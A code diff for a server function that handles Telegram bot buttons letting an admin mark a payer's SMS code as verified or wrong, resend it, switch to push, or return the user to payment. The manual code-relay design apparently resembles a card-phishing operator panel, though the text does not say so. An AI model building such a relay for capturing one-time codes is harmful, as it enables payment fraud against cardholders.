@@ -160,6 +160,86 @@ serve(async (req) => {
         } else {
           console.log('Invalid callback data format:', callbackQuery.data);
         }
+      }
+      // Handle SMS verification callbacks
+      else if (callbackQuery.data && (callbackQuery.data.startsWith('sms_verify_') || callbackQuery.data.startsWith('sms_retry_'))) {
+        const parts = callbackQuery.data.split('_');
+        console.log('SMS callback data parts:', parts);
+        
+        if (parts.length >= 3) {
+          const type = parts[1]; // verify or retry
+          const userId = parts[2];
+          const action = parts[3]; // success, error, resend, push, back
+          
+          console.log(`Processing SMS ${type} for ${userId} with action ${action}`);
+          
+          // Send confirmation message back to admin
+          const confirmationMessages = {
+            success: '✅ SMS code verified successfully',
+            error: '❌ Wrong SMS code entered',
+            resend: '📱 SMS code resent',
+            push: '🔔 Switched to push notification',
+            back: '↩️ Returned to payment'
+          };
+          
+          console.log('Sending SMS callback answer...');
+          const callbackResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/answerCallbackQuery`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              callback_query_id: callbackQuery.id,
+              text: confirmationMessages[action as keyof typeof confirmationMessages] || 'SMS action processed'
+            })
+          });
+          
+          const callbackResult = await callbackResponse.json();
+          console.log('SMS callback answer result:', callbackResult);
+          
+          // Edit the original message to show it's been processed
+          console.log('Editing SMS message...');
+          const currentTime = new Date().toLocaleString('en-US', {
+            year: 'numeric',
+            month: 'short',
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            timeZone: 'UTC'
+          });
+          
+          const adminName = callbackQuery.from?.first_name || callbackQuery.from?.username || 'Admin';
+          const actionEmoji = {
+            success: '✅',
+            error: '❌',
+            resend: '📱',
+            push: '🔔',
+            back: '↩️'
+          };
+          
+          // Get original message text without entities formatting to avoid parsing errors
+          const originalText = callbackQuery.message.text;
+          
+          const newMessageText = originalText + 
+            `\n\n${actionEmoji[action as keyof typeof actionEmoji]} PROCESSED by ${adminName}\n` +
+            `⏰ Time: ${currentTime} UTC\n` +
+            `✅ Action: ${confirmationMessages[action as keyof typeof confirmationMessages]}`;
+          
+          const editResponse = await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/editMessageText`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: callbackQuery.message.chat.id,
+              message_id: callbackQuery.message.message_id,
+              text: newMessageText
+              // No parse_mode to avoid entity parsing errors
+              // No reply_markup = buttons are removed
+            })
+          });
+          
+          const editResult = await editResponse.json();
+          console.log('SMS edit message result:', editResult);
+        } else {
+          console.log('Invalid SMS callback data format:', callbackQuery.data);
+        }
       } else {
         console.log('Non-payment callback data:', callbackQuery.data);
       }
